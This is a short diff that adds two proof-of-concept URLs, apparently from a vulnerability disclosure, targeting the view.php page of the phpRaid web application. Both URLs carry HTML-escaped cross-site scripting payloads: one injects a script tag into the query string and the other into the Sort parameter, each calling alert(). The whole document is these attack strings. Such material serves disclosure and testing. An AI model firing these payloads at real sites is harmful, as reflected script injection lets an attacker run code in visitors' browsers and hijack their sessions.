@@ -1,0 +1,3 @@
+Http://www.example.com/phpRaid/view.php?&lt;script&gt;alert(&#039;Xss%20Vulnerability&#039;);&lt;/script&gt;
+Http://www.example.com/phpRaid/view.php?mode=view&amp;raid_id=6&amp;Sort=&gt;&lt;script&gt;var%20Xss_Vulnerability=31033031;alert(Xss_Vulnerability);&lt;/script&gt;
+
